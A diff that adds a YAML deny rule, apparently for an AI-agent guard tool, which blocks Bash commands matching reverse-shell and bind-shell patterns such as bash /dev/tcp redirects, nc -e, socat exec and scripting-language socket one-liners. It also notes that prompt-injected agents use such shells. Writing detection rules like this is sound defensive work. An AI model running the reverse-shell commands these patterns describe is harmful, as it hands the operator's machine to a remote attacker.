@@ -1,0 +1,41 @@
+schema_version: 1
+id: rogue.reverse-shell
+name: Block reverse-shell and bind-shell shapes
+description: |
+  Denies bash invocations matching well-known reverse-shell and bind-
+  shell patterns: `bash -i >& /dev/tcp/host/port`, `nc -e`, `ncat
+  --exec`, `socat ... exec:`, mkfifo+pipe-to-shell, and the canonical
+  Python/Perl/PHP/Ruby socket+shell one-liners. These are the shapes a
+  prompt-injected agent uses to hand the operator's machine to a remote
+  attacker; they are the agent equivalent of the post-exploit reverse
+  shell every penetration tester reaches for.
+severity: critical
+tags:
+  - reverse-shell
+  - rce
+  - bash
+  - mitre-t1059
+authors:
+  - github: RonCodes88
+license: Apache-2.0
+compatible_agentlock: ">=0.1.0"
+gate:
+  match:
+    tool: Bash
+    any_command_regex:
+      - '\b(?:bash|sh|zsh|dash|ksh)\s+-i\s*[<>]&?\s*/dev/(?:tcp|udp)/'
+      - '\bexec\s+\d*<>\s*/dev/(?:tcp|udp)/'
+      - '\bnc(?:at)?\s+(?:[^|;&]*\s+)?-e\s+'
+      - '\bncat\s+(?:[^|;&]*\s+)?--exec(?:\s|=)'
+      - '\bsocat\s+(?:[^|;&]*\s+)?(?:exec|system):'
+      - '\bsocat\s+(?:[^|;&]*\s+)?TCP[46]?:[^\s]+\s+EXEC:'
+      - '\bmkfifo\s+[^|;&]*&&\s*[^|;&]*\|\s*(?:bash|sh|zsh)'
+      - '\bpython3?\s+-c\s+["''][^"'']*socket\.socket\([^"'']*'
+      - '\bperl\s+-e\s+["''][^"'']*socket'
+      - '\bphp\s+-r\s+["''][^"'']*fsockopen'
+      - '\bruby\s+-r?e?\s*["''][^"'']*TCPSocket'
+      - '\bawk\s+''[^'']*\|\s*&\s*"/inet/tcp/'
+      - '\bbusybox\s+nc\s+(?:[^|;&]*\s+)?-e\b'
+  evaluate:
+    - kind: always
+      action: deny
